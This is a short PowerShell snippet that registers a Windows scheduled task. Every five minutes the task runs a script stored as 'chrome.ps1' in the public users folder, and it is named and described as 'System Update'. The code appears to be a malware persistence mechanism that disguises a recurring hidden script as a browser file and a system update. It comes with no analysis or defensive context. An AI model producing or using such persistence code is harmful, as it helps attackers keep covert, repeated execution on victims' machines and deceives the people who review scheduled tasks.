$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument 'C:\Users\Public\Chrome\chrome.ps1'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'System Update' -Description 'System Updates'
